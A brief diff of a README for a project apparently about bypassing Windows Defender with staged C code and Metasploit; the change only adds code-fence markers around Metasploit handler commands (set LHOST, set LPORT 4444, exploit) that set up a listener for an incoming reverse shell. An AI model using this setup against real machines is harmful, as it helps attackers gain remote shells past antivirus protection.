@@ -69,8 +69,10 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
 ```
    set LHOST <LOCAL IP>
    ```
+```
    set LPORT 4444
 ```
 ```
    exploit
+```
 ```
